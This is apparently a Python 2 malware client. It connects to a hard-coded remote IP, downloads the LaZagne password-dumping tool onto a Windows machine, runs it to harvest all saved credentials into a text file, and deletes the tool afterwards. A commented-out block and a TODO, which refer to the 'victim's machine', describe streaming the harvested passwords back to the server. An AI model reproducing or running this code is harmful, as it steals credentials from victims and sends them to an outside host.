


#---------------------------------------------------------------------------------------------
'''it'll save the passwords.txt on client machine then send it to the server
os.system("C:\Users\VOCFU\Desktop\laZagne_x64.exe all >C:\Users\VOCFU\Desktop\passwords.txt")
with open("C:\Users\VOCFU\Desktop\passwords.txt", "rb") as f1:
	l = f1.read(1024)
	while (l):
		clientsocket.send(l)
		l = f1.read(1024)
f1.close()'''
#---------------------------------------------------------------------------------------------


import socket
import os

host = '52.15.183.149'
port = 18106

clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect((host, port))

with open("C:\Users\VOCFU\Desktop\laZagne_x64.exe", "wb") as f:
    while True:
        data = clientsocket.recv(1024)
        if not data:
            break
        f.write(data)
f.close()

# TODO: fix it later first save passwords text on victim's machine then send it through socket to the server
# it'll save the passwords.txt on server side where the laZSP_C is running cause for now we're testing on same machine!!
os.system("C:\Users\VOCFU\Desktop\laZagne_x64.exe all >passwords.txt")
os.remove("C:\Users\VOCFU\Desktop\laZagne_x64.exe")
clientsocket.close()